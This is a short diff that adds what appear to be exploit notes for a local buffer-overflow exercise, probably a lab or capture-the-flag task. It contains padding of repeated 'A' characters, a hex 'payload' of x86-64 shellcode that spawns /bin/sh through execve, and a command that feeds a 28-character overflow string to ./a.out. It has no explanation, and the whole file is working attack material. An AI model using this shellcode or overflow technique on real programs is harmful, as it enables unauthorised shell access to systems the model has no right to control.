@@ -1,0 +1,12 @@
+AAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA
+
+payload:
+b8000000 005048bb 2f2f6269 6e2f7368
+53b83b00 00004889 e70f0500
+
+
+./a.out $(seq -sA 28 | tr -d '[:digit:]')$(echo -e -n "")
+
+
+
